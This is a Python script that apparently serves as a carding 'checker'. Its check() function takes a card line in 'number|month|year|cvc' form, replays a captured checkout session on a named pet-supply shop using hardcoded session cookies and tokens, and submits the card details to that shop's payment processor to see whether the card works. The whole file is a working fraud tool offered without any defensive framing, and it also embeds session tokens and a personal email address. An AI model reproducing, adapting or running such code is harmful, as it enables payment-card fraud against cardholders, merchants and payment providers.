def check(ccx):
  import requests
  from fake_useragent import UserAgent
  import json
  import re
  
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#Mo3gza
    yy = yy.split("20")[1]
  r = requests.session()
  ua = UserAgent()
  user_agent = ua.random
  url = "https://www.petswyak.com/shop/payment/transaction/1458"

  payload = {
      "id": 6,
      "jsonrpc": "2.0",
      "method": "call",
      "params": {
        "provider_id": 21,
        "payment_method_id": 209,
        "token_id": None,
        "amount": None,
        "flow": "redirect",
        "tokenization_requested": False,
        "landing_route": "/shop/payment/validate",
        "is_validation": False,
        "access_token": "4395dba2-b54d-48f6-8909-60f59673e106",
        "csrf_token": "86d5eaf5868fa17f075d9500a8fbaeac71b9b851o1779449165"
      }
    }

  headers = {
      'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 DuckDuckGo/7 Safari/605.1.15",
      'Content-Type': "application/json",
      'sec-fetch-site': "same-origin",
      'accept-language': "en-US,en;q=0.9",
      'sec-fetch-mode': "cors",
      'origin': "https://www.petswyak.com",
      'referer': "https://www.petswyak.com/shop/payment",
      'sec-fetch-dest': "empty",
      'Cookie': "tz=Asia/Beirut; session_id=d90a30584d44794ab2cacbd66aa1f353d49e6681; im_livechat_history=[\"/web/login\",\"/my\",\"/\",\"/shop/cart\",\"/shop/address?partner_id=3395&mode=billing\",\"/shop/address\",\"/shop/address?partner_id=3396&mode=shipping\",\"/shop/extra_info\",\"/shop/payment\"]; _gcl_au=1.1.1732164536.1747756424; website_cookies_bar={\"required\": true,\"optional\": true}; frontend_lang=en_US"
    }

  response = requests.post(url, data=json.dumps(payload), headers=headers)
  html = response.json()['result'].get('redirect_form_html', '')
  id = re.search(r'payment_id=([A-Z0-9]+)', html).group(1) if re.search(r'payment_id=([A-Z0-9]+)', html) else None
  url = "https://secure.tesspayments.com/Pay/MCPaymentPage"

  params = {
      'card': "credit",
      'paymentID': id
    }

  headers = {
      'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 DuckDuckGo/7 Safari/605.1.15",
      'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      'sec-fetch-site': "same-origin",
      'sec-fetch-dest': "document",
      'accept-language': "en-US,en;q=0.9",
      'sec-fetch-mode': "navigate",
      'referer': f"https://secure.tesspayments.com/payments/checkout?payment_id={id}"
    }

  response = requests.get(url, params=params, headers=headers)
  token = re.search(r'&quot;token&quot;:&quot;([^&]+)&quot;', response.text).group(1)
  url = "https://checkout.tesspayments.com/processing/purchase/card"

  payload = {
      "billingAddress": {
        "phone": "+15572552539",
        "country": "QA"
      },
      "browserInfo": {
        "colorDepth": 24,
        "javaEnabled": False,
        "javaScriptEnabled": True,
        "language": "en-US",
        "screenHeight": 896,
        "screenWidth": 414,
        "timeZoneOffset": -180,
        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 DuckDuckGo/7 Safari/605.1.15",
        "platform": "MacIntel"
      },
      "card": n,
      "cvv": cvc,
      "email": "gamerabdallagfghh@gmail.com",
      "expiryDate": mm+yy,
      "inputType": "text",
      "month": mm,
      "name": "ALI HA",
      "panBrandLogo": "brand-logo-visa",
      "year": yy
    }

  headers = {
      'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 DuckDuckGo/7 Safari/605.1.15",
      'Accept': "application/json, text/plain, */*",
      'Content-Type': "application/json",
      'content-type': "application/json;charset=utf-8",
      'x-requested-with': "XMLHttpRequest",
      'sec-fetch-site': "same-origin",
      'accept-language': "en-US,en;q=0.9",
      'sec-fetch-mode': "cors",
      'token': token,
      'origin': "https://checkout.tesspayments.com",
      'referer': "https://checkout.tesspayments.com/",
      'sec-fetch-dest': "empty"
    }

  r2 = requests.post(url, data=json.dumps(payload), headers=headers)
  print(r2.text)
  return r2.text
